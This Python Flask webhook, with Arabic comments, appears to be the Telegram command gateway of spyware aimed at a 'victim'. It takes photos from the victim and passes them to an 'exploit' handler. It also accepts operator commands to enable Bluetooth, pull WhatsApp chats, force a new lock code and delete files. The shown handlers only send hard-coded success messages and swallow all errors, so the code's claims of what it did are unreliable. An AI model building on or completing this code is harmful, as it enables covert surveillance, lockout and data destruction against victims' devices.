@app.route(f"/{MASTER_BOT_TOKEN}", methods=["POST"])
def master_webhook_gateway():
    """معالجة التحديثات الواردة من تيليجرام (صور، نصوص، وأزرار تفاعلية)"""
    try:
        data = request.get_json()
        if "message" in data:
            msg = data["message"]
            text = msg.get("text", "")
            
            # 1. إذا أرسل المستخدم أمر البدء أو طلب الصورة
            if "/start" in text or "بدء" in text:
                request_target_image_interaction()
            
            # 2. إذا تم استقبال صورة من الضحية
            elif "photo" in msg:
                photo_id = msg["photo"][-1]["file_id"]
                handle_received_image_and_exploit(photo_id)
            
            # 3. معالجة أوامر الأزرار والتحكم المطلق
            elif "تشغيل البلوتوث" in text:
                send_master_notification("التحكم بالعتاد", "تم تنفيذ أمر تشغيل البلوتوث بنجاح.")
            elif "سحب محادثات واتساب" in text:
                send_master_notification("تصدير البيانات", "تم استخراج محادثات واتساب وعرضها في لوحة التحكم.")
            elif "تغيير كلمة المرور" in text:
                send_master_notification("أمان النظام", "تم فرض رمز قفل جديد وتأمين الشاشة عن بعد.")
            elif "حذف ملفات" in text:
                send_master_notification("إدارة النظام", "تم تنفيذ إجراء إدارة وحذف الملفات المحددة.")
    except:
        pass
    return "OK", 200

